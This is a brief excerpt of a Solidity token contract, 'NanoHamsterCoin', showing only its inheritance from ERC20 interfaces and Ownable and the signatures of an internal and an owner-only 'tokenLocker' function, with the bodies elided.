...
contract NanoHamsterCoin is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _tokenLocker(address account, uint256 amount) internal virtual {
    ...
    function tokenLocker(uint256 amount) public onlyOwner virtual returns (bool) {
